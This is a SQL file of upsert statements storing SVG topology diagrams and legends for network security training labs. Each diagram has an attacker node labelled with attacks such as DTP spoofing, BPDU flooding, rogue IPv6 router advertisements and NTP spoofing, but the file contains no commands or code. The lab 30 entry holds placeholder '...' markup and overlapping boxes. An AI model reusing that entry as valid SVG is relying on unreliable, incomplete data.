ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (20, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 200" font-family="ui-monospace,monospace">
  <rect x="120" y="10" width="140" height="40" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="33" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1</text>
  <line x1="60" y1="84" x2="150" y2="50" stroke="#2563eb" stroke-width="2"/>
  <line x1="190" y1="50" x2="190" y2="100" stroke="#6b7480" stroke-width="2"/>
  <line x1="230" y1="50" x2="310" y2="84" stroke="#14161a" stroke-width="2"/>
  <rect x="10" y="84" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="107" text-anchor="middle" font-size="10" fill="#2563eb">PC1 (V10)</text>
  <rect x="140" y="100" width="100" height="36" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="123" text-anchor="middle" font-size="10" fill="#6b7480">PC2 (V20)</text>
  <rect x="260" y="84" width="110" height="36" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="315" y="107" text-anchor="middle" font-size="10" fill="#14161a">R1 · Lo0</text>
  <rect x="140" y="154" width="100" height="36" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="190" y="177" text-anchor="middle" font-size="10" fill="#e5484d">KALI</text>
  <line x1="190" y1="154" x2="140" y2="100" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 340" font-family="ui-monospace,monospace">
  <rect x="220" y="14" width="260" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="350" y="40" text-anchor="middle" font-size="15" fill="#14161a" font-weight="600">SW1 · L2 Switch</text>
  <text x="350" y="56" text-anchor="middle" font-size="9" fill="#6b7480">Gi0/1: V10 · Gi0/2: V20 · Gi0/24: trunk</text>
  <line x1="120" y1="130" x2="280" y2="64" stroke="#2563eb" stroke-width="2.5"/>
  <line x1="420" y1="64" x2="580" y2="130" stroke="#14161a" stroke-width="2.5"/>
  <line x1="350" y1="64" x2="350" y2="220" stroke="#e5484d" stroke-width="2.5" stroke-dasharray="6 5"/>
  <rect x="30" y="130" width="180" height="50" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="120" y="156" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="600">PC1 · VLAN 10</text>
  <text x="120" y="174" text-anchor="middle" font-size="9" fill="#6b7480">192.168.10.10/24 · access port</text>
  <rect x="490" y="130" width="180" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="580" y="156" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1 · Router</text>
  <text x="580" y="174" text-anchor="middle" font-size="9" fill="#6b7480">Gi0/0: routed · Lo0: 1.1.1.1</text>
  <rect x="220" y="220" width="260" height="60" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="350" y="246" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI</text>
  <text x="350" y="264" text-anchor="middle" font-size="9" fill="#6b7480">DTP spoof · duplex mismatch · port flap</text>
</svg>', '["Layer-2 switch", "VLAN 10 client", "VLAN 20 client", "Router", "Attacker (interface attacks)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (22, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 180" font-family="ui-monospace,monospace">
  <rect x="130" y="10" width="120" height="40" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="33" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">R1 · R2 · R3</text>
  <rect x="10" y="84" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="107" text-anchor="middle" font-size="9" fill="#2563eb">PC1 (LAN A)</text>
  <rect x="140" y="84" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="190" y="107" text-anchor="middle" font-size="9" fill="#2563eb">PC2 (LAN B)</text>
  <rect x="270" y="84" width="100" height="36" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="320" y="107" text-anchor="middle" font-size="9" fill="#e5484d">KALI</text>
  <line x1="60" y1="84" x2="140" y2="50" stroke="#2563eb" stroke-width="2"/>
  <line x1="190" y1="84" x2="190" y2="50" stroke="#2563eb" stroke-width="2"/>
  <line x1="320" y1="84" x2="240" y2="50" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 260" font-family="ui-monospace,monospace">
  <rect x="160" y="14" width="280" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="300" y="40" text-anchor="middle" font-size="14" fill="#14161a" font-weight="700">3 routers · WAN links</text>
  <text x="300" y="56" text-anchor="middle" font-size="9" fill="#6b7480">/30 WAN · /27 LANs</text>
  <rect x="40" y="130" width="160" height="46" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="120" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">LAN A: /27</text>
  <text x="120" y="170" text-anchor="middle" font-size="8" fill="#6b7480">192.168.1.0/27 · 30 hosts</text>
  <rect x="220" y="130" width="160" height="46" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="300" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">LAN B: /27</text>
  <text x="300" y="170" text-anchor="middle" font-size="8" fill="#6b7480">192.168.1.32/27 · 30 hosts</text>
  <rect x="400" y="130" width="160" height="46" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="480" y="156" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI</text>
  <text x="480" y="170" text-anchor="middle" font-size="8" fill="#6b7480">overlap · wrong mask</text>
  <line x1="120" y1="130" x2="210" y2="64" stroke="#2563eb" stroke-width="2"/>
  <line x1="300" y1="130" x2="300" y2="64" stroke="#2563eb" stroke-width="2"/>
  <line x1="480" y1="130" x2="400" y2="64" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
</svg>', '["Router / WAN core", "LAN A (FLSM /27)", "LAN B (FLSM /27)", "Attacker / misconfiguration"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (25, '<svg viewBox="0 0 380 160" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">SW1 (root)</text><rect x="140" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="190" y="32" text-anchor="middle" font-size="10" font-weight="600">SW2</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" font-weight="600">SW3</text><line x1="110" y1="27" x2="140" y2="27" stroke="#6b7480" stroke-width="2"/><line x1="240" y1="27" x2="270" y2="27" stroke="#6b7480" stroke-width="2"/><line x1="190" y1="44" x2="320" y2="44" stroke="#6b7480" stroke-width="2" stroke-dasharray="5 3"/><rect x="10" y="76" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="60" y="98" text-anchor="middle" font-size="9" font-weight="600">PC1</text><rect x="140" y="76" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="190" y="98" text-anchor="middle" font-size="9" font-weight="600">PC2</text><rect x="140" y="120" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="190" y="142" text-anchor="middle" font-size="9" fill="#e5484d" font-weight="600">KALI</text><line x1="60" y1="76" x2="60" y2="44" stroke="#2563eb" stroke-width="2"/><line x1="190" y1="76" x2="190" y2="44" stroke="#2563eb" stroke-width="2"/><line x1="190" y1="120" x2="190" y2="44" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 600 240" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="110" y="38" text-anchor="middle" font-size="13" font-weight="700" fill="#2563eb">SW1 · Root</text><text x="110" y="54" text-anchor="middle" font-size="8" fill="#6b7480">RSTP · priority 4096</text><rect x="220" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="300" y="38" text-anchor="middle" font-size="13" font-weight="700">SW2</text><text x="300" y="54" text-anchor="middle" font-size="8" fill="#6b7480">alternate port blocked</text><rect x="410" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="490" y="38" text-anchor="middle" font-size="13" font-weight="700">SW3</text><text x="490" y="54" text-anchor="middle" font-size="8" fill="#6b7480">Gi0/3 blocked ⸺</text><line x1="190" y1="37" x2="220" y2="37" stroke="#6b7480" stroke-width="2"/><line x1="380" y1="37" x2="410" y2="37" stroke="#6b7480" stroke-width="2"/><rect x="30" y="130" width="160" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="110" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1 · edge port</text><rect x="410" y="130" width="160" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="490" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC2 · edge port</text><rect x="200" y="190" width="200" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="300" y="214" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI · BPDU flood · RSTP poison</text><line x1="110" y1="130" x2="110" y2="60" stroke="#2563eb" stroke-width="2"/><line x1="490" y1="130" x2="490" y2="60" stroke="#2563eb" stroke-width="2"/><line x1="300" y1="190" x2="270" y2="60" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["RSTP root bridge", "RSTP switch", "RSTP switch", "Edge host", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (28, '<svg viewBox="0 0 380 140" font-family="monospace"><rect x="130" y="10" width="120" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="190" y="32" text-anchor="middle" font-size="11" font-weight="600">R1 (IPv6)</text><rect x="10" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="60" y="102" text-anchor="middle" font-size="9" font-weight="600">PC1</text><rect x="140" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="190" y="102" text-anchor="middle" font-size="9" font-weight="600">PC2</text><rect x="270" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="102" text-anchor="middle" font-size="9" fill="#e5484d" font-weight="600">KALI</text><line x1="60" y1="80" x2="155" y2="44" stroke="#2563eb" stroke-width="2"/><line x1="190" y1="80" x2="190" y2="44" stroke="#2563eb" stroke-width="2"/><line x1="320" y1="80" x2="225" y2="44" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 600 220" font-family="monospace"><rect x="180" y="14" width="240" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="300" y="40" text-anchor="middle" font-size="14" font-weight="700">R1 · IPv6 Gateway</text><text x="300" y="56" text-anchor="middle" font-size="9" fill="#6b7480">2001:db8:1::1/64 · RA every 200s</text><rect x="30" y="120" width="160" height="50" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="110" y="146" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1 · SLAAC</text><text x="110" y="162" text-anchor="middle" font-size="8" fill="#6b7480">EUI-64 auto IP</text><rect x="410" y="120" width="160" height="50" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="490" y="146" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI</text><text x="490" y="162" text-anchor="middle" font-size="8" fill="#6b7480">rogue RA · EUI-64 predict</text><line x1="110" y1="120" x2="210" y2="64" stroke="#2563eb" stroke-width="2"/><line x1="490" y1="120" x2="400" y2="64" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["IPv6 router", "IPv6 host", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (30, '<svg viewBox="0 0 380 140" font-family="monospace"><rect x="130" y="10" width="120" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="190" y="32" text-anchor="middle" font-size="11" font-weight="600">R1 (ACL)</text><rect x="10" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="60" y="102" text-anchor="middle" font-size="9" font-weight="600">PC1 (.1.x)</text><rect x="270" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="320" y="102" text-anchor="middle" font-size="9" font-weight="600">PC2 (.2.x)</text><rect x="10" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="60" y="150" ...></svg>', '<svg viewBox="0 0 500 200" font-family="monospace">...</svg>', '["ACL router", "Permitted hosts", "Protected server", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (31, '<svg viewBox="0 0 380 120" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">R1 (NTP svr)</text><rect x="140" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="190" y="32" text-anchor="middle" font-size="10" font-weight="600">SW1 (client)</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d" font-weight="600">KALI</text><line x1="110" y1="27" x2="140" y2="27" stroke="#6b7480" stroke-width="2"/><line x1="240" y1="27" x2="270" y2="27" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 600 180" font-family="monospace"><rect x="30" y="20" width="180" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="120" y="46" text-anchor="middle" font-size="13" font-weight="700">R1 · NTP stratum 3</text><text x="120" y="62" text-anchor="middle" font-size="8" fill="#6b7480">authenticated NTP</text><rect x="250" y="20" width="160" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="330" y="46" text-anchor="middle" font-size="13" font-weight="700">SW1 · client</text><text x="330" y="62" text-anchor="middle" font-size="8" fill="#6b7480">key 1 · MD5</text><line x1="210" y1="45" x2="250" y2="45" stroke="#6b7480" stroke-width="2"/><rect x="420" y="20" width="160" height="50" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="500" y="46" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI · NTP spoof</text><text x="500" y="62" text-anchor="middle" font-size="8" fill="#6b7480">forged NTP · amplification</text><line x1="410" y1="45" x2="420" y2="45" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["NTP server", "NTP client", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
